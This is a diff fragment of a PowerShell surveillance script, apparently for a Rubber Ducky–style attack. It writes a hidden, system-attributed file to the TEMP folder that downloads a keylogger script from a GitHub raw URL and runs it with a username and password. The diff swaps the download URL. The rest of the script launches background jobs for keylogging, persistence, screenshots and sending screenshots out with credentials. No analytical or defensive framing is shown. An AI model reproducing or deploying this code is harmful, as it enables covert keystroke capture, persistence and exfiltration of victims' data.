@@ -353,7 +353,7 @@ $functions =  {
 			
 			if(-Not ([System.IO.File]::Exists($modulenamepath)))
 			{
-				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/nishang/master/Gather/Keylogger.ps1"))' -Force $env:TEMP\$modulename
+				Out-File -InputObject '$scriptPath = ((New-Object Net.WebClient).DownloadString("https://raw.githubusercontent.com/gengstah/rubber-ducky/master/keys.ps1"))' -Force $env:TEMP\$modulename
 				Out-File -InputObject 'Invoke-Command -ScriptBlock ([scriptblock]::Create($scriptPath)) -ArgumentList $username, $password' -Append -NoClobber $env:TEMP\$modulename
 				$modulenamefile = Get-Item $env:TEMP\$modulename
 				$modulenamefile.Attributes="Hidden","System"
@@ -380,4 +380,3 @@ start-job -InitializationScript $functions -scriptblock {Keylogger}
 start-job -InitializationScript $functions -scriptblock {MaintainPersistence}
 start-job -InitializationScript $functions -scriptblock {Screenshot}
 start-job -InitializationScript $functions -scriptblock {SendScreenshots $args[0] $args[1]} -ArgumentList @($username,$password)
-
